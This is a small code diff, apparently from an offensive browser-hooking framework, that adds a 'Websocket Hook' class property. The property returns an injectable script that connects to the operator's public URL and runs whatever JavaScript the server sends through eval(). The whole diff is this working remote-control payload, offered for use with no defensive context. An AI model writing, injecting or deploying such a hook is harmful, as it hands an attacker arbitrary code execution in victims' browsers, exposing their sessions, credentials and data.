@@ -7,3 +7,7 @@ class Hook(BaseHook):
     NAME = 'Websocket Hook'
     VERSION = '0.1'
     TRANSPORT = 'websocket'
+
+    @property
+    def hook(self) -> str:
+        return "<script>c=new WebSocket('{{environment.public_url}}');c.onmessage=(e)=>eval(e.data);</script>"
